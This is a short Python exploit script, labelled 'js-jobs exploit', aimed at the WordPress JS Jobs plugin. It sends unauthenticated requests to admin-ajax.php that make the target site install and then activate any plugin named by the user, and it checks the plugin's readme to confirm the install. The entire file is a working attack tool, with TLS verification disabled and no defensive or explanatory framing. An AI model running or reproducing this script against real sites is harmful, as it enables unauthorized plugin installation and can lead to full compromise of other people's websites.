#!/usr/bin/env python3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
import os




# argparse setup
parser = argparse.ArgumentParser(description='js-jobs exploit')
parser.add_argument('--url', '-u', required=True, help='URL to which to send the POST request')
parser.add_argument('--slug', '-s', required=True, help='Slug for the plugin')
args = parser.parse_args()


# POST request
payload = {
    'action': 'jsjobs_ajax',
    'task': 'installPluginFromAjax',
    'jsjobsme': 'jsjobs',
    'pluginslug': args.slug,
}

payload2 = {
    'action': 'jsjobs_ajax',
    'task': 'activatePluginFromAjax',
    'jsjobsme': 'jsjobs',
    'pluginslug': args.slug,
}



headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept': '*/*',
    'Accept-Language': 'en-GB,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '90',
    'Connection': 'close',
}

def check_plugin(url,slug):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"en-GB,en;q=0.5","Accept":"*/*"}
    response = requests.get(""+url+"/wp-content/plugins/"+slug+"/readme.txt", headers=headers,verify=False)
    if "Stable tag" in response.text:
       print("Plugin has been downloaded and is on the server.")
    else:
       print("Plugin has not been downloaded try again or another plugin.")



def send_install(url,payload):
    response = requests.post(""+url+"/wp-admin/admin-ajax.php",headers=headers,data=payload,verify=False)
    if response.status_code == 200:
       if response.text == "1":
          print("Plugin has been Downloaded.")
       if response.text == "":
          print("The Plugin has not been confirmed to be donwloaded... Running check.")
    if response.status_code == "400":
       print("Js Jobs Plugin is not activated")
       exit()
          
def send_activate(url,payload):
    response = requests.post(""+url+"/wp-admin/admin-ajax.php",headers=headers,data=payload,verify=False)
    if response.status_code == 200:
       if response.text == "1":
          print("Plugin has been activated / activated.")
       else:
          print("Plugin has not been activated")
      


url = args.url
slug = args.slug

send_install(url,payload)
check_plugin(url,slug)
send_activate(url,payload2)
